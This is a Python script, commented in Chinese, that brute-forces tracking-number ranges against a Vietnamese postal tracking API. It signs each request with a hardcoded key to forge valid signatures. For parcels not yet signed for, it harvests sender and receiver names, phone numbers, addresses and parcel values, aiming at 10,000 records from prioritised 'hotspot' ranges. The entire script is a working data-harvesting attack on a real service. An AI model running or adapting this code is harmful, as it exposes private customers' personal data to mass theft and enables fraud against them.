#!/usr/bin/env python3
"""
专门爬取热点区域 - 高效获取10000个未签收运单号
基于755个运单号分析出的热点区域
"""
import hashlib
import requests
import json
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

KEY = '34784DCEAD1484AA758A8C033FB0F858BDACABC7BE8FC2F5CC5AFD376AB8654A'
API_URL = 'https://api-dingdong.ems.com.vn/api/TrackTrace/Lading'

lock = threading.Lock()
found_count = 725
tested_count = 0
valid_codes = []

def verify_tracking(code):
    global found_count, tested_count
    
    signature = hashlib.sha256((code.upper() + KEY).encode()).hexdigest().upper()
    payload = {'LadingCode': code, 'Signature': signature}
    
    try:
        r = requests.post(API_URL, json=payload, timeout=8)
        result = r.json()
        
        with lock:
            tested_count += 1
        
        if result.get('Code') == '00':
            data = result.get('Value', {})
            
            # 只要未签收的
            if data.get('SignatureCapture'):
                return None
            
            info = {
                'code': code,
                'value': data.get('Value', 0) or 0,
                'fee': data.get('Fee', 0) or 0,
                'sender': data.get('SenderName', ''),
                'receiver': data.get('ReceiverName', ''),
                'receiver_phone': data.get('ReceiverMobile', ''),
                'sender_phone': data.get('SenderMobile', ''),
                'receiver_address': data.get('ReceiverAddress', ''),
            }
            
            with lock:
                found_count += 1
            
            return info
    except:
        pass
    
    time.sleep(0.05)
    return None

print("=" * 80)
print("🔥 热点区域爬取 - 快速获取10000个未签收运单")
print("=" * 80)

# 热点区域（按密度排序）
hotspots = [
    # EF047热点区域（208个来自680000-689999）
    ('EF047', 680000, 689999, 208, '超级热点🔥🔥🔥'),
    
    # EF047次热点
    ('EF047', 550000, 559999, 124, '热点🔥🔥'),
    ('EF047', 520000, 529999, 61, '热点🔥'),
    
    # 扩展EF047范围
    ('EF047', 670000, 679999, 0, '预测热点'),
    ('EF047', 690000, 699999, 0, '预测热点'),
    ('EF047', 560000, 569999, 0, '预测热点'),
    ('EF047', 540000, 549999, 0, '预测热点'),
    ('EF047', 530000, 539999, 0, '预测热点'),
    
    # EF043大量区域（203个）
    ('EF043', 571000, 595999, 203, '超级热点🔥🔥🔥'),
    ('EF043', 560000, 570999, 0, '预测热点'),
    ('EF043', 596000, 610000, 0, '预测热点'),
    
    # EJ711热点区域（59个来自462000-462999）
    ('EJ711', 462000, 462999, 59, '热点🔥🔥'),
    ('EJ711', 461000, 461999, 24, '热点🔥'),
    ('EJ711', 463000, 463999, 5, '小热点'),
    ('EJ711', 460000, 460999, 0, '预测热点'),
    ('EJ711', 464000, 469999, 0, '预测热点'),
    
    # EK042/043热点
    ('EK042', 227000, 228999, 20, '小热点'),
    ('EK043', 226000, 246999, 10, '小热点'),
    ('EK043', 539000, 539999, 2, '小热点'),
    
    # EL135热点
    ('EL135', 248000, 252000, 5, '小热点'),
    ('EL135', 746000, 757000, 3, '小热点'),
    
    # 其他前缀扩展
    ('EB102', 890000, 970000, 6, '小热点'),
    ('EG040', 816000, 936999, 5, '小热点'),
    ('EG046', 7000, 8000, 0, '预测'),
    ('EI153', 234000, 234999, 1, '小热点'),
    ('EI810', 207000, 207999, 1, '小热点'),
    ('EJ703', 829000, 829999, 1, '小热点'),
    ('EJ720', 641000, 641999, 2, '小热点'),
    ('ED292', 717000, 717999, 1, '小热点'),
    ('EE077', 581000, 581999, 1, '小热点'),
]

print(f'\n已有: 约725个未签收运单')
print(f'目标: 10000个')
print(f'还需: 约9275个\n')

print('🔥 热点区域列表（按密度排序）:\n')
for i, (prefix, start, end, known, label) in enumerate(hotspots[:10], 1):
    count = end - start + 1
    density = f'{known}/{count}' if known > 0 else '预测'
    print(f'{i:2d}. {prefix}{start}VN ~ {prefix}{end}VN ({count:,}个) {label}')
    print(f'    已知有效: {density}')

print(f'\n共 {len(hotspots)} 个热点区域')
print()

# 估算
total_range = sum(end - start + 1 for _, start, end, _, _ in hotspots)
known_valid = sum(known for _, _, _, known, _ in hotspots)

print('='*80)
print('📊 预估')
print('='*80)
print(f'总搜索空间: {total_range:,}个运单号')
print(f'已知有效: {known_valid}个')
print(f'预计有效率: {known_valid*100//total_range if total_range > 0 else 0}%')
print()
print(f'预计找到10000个需要:')
print(f'  - 测试: 约{10000*100//max(known_valid*100//total_range, 1):,}个')
print(f'  - 时间: 约{10000*100//max(known_valid*100//total_range, 1)//564:.0f}分钟')
print('='*80)
" 2>&1
